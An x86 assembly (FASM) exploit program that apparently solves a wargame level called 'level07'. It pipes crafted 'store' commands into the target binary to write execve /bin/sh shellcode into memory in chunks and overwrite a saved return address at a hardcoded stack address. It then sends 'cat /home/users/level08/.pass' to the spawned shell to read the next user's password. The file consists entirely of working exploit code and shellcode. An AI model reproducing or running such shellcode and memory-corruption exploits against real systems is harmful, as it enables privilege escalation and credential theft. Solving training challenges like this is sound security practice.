
format ELF executable $03
entry _start

macro itoa2Dec number* {
    local _number, _modulo, _length
    _number = (number)
    if (_number < $00)
        db "-"
        _number = (-_number)
    end if
    _length = $00
    if (~(definite __itoa2Dec_virtual))
        virtual at $00
            __itoa2Dec_virtual::
        end virtual
    end if
    assert (_number eqtype $00)
    while _number
        _modulo = _number mod $0A
        _number = _number / $0A
        _length = _length + $01
        virtual __itoa2Dec_virtual
            db (_modulo+"0")
        end virtual
    end while
    repeat _length
        virtual __itoa2Dec_virtual
            load _number byte from __itoa2Dec_virtual:($-%)
        end virtual
        db _number
    end repeat
}

struc string data*& {
    .: db data
    .length = ($ - .)
}

struc timespec {
    .tv_sec: rq $01
    .tv_nsec: rq $01
}

virtual at $00
    timespec timespec
    timespec.sizeof = $
end virtual

segment executable readable
_start:
    and esp, not $0F
    sub esp, $08
    mov eax, $2A
    mov ebx, esp
    int $80
    test eax, eax
    jnz .exit
    mov eax, $04
    mov ebx, dword [esp+$04]
    mov ecx, _payload
    mov edx, _payload.length
    int $80
    mov eax, $3F
    mov ebx, dword [esp]
    xor ecx, ecx
    int $80
    mov eax, $02
    int $80
    test eax, eax
    jz .child
    mov ecx, timespec.sizeof
    sub esp, ecx
    xor al, al
    mov edi, esp
    cld
    rep stosb
    mov byte [esp+timespec.tv_sec], $01
    mov eax, $A2
    mov ebx, esp    
    xor ecx, ecx
    int $80
    add esp, timespec.sizeof
    mov eax, $04
    mov ebx, dword [esp+$04]
    mov ecx, _command
    mov edx, _command.length
    int $80
    jmp .exit
.child:
    mov eax, $0B
    mov ebx, _program
    xor edx, edx
    push edx ebx
    mov ecx, esp
    int $80
.exit:
    mov eax, $01
    xor ebx, ebx
    int $80

segment readable
_program: db "/home/users/level07/level07", $00
_command string "cat /home/users/level08/.pass", $0A

_payload:

virtual at $00
_shellcode::
    push "/sh_"
    nop
    jmp short _next_1

    dd $00

    _next_1:
    xor byte [esp+$03], '_'
    nop
    jmp short _next_2

    dd $00

    _next_2:
    push "/bin"
    nop
    jmp short _next_3

    dd $00

    _next_3:
    mov ebx, esp
    xor edx, edx
    push edx
    push ebx
    jmp short _next_4

    dd $00

    _next_4:
    mov ecx, esp
    xor eax, eax
    mov al, $0B
    int $80
_shellcode.length = $
end virtual

_base = $FFFFDCA4

db "store", $0A
itoa2Dec _base
db $0A, "1", $0A

repeat (_shellcode.length shr $02)
    if (% mod $03)
        load opcode dword from _shellcode:((%-$01) * $04)
        db "store", $0A
        itoa2Dec opcode
        db $0A
        itoa2Dec (%+$03)
        db $0A
    end if 
end repeat

db "store", $0A
itoa2Dec (_base-$10)
db $0A, "-11", $0A

db "quit", $0A

_payload.length = ($ - _payload)

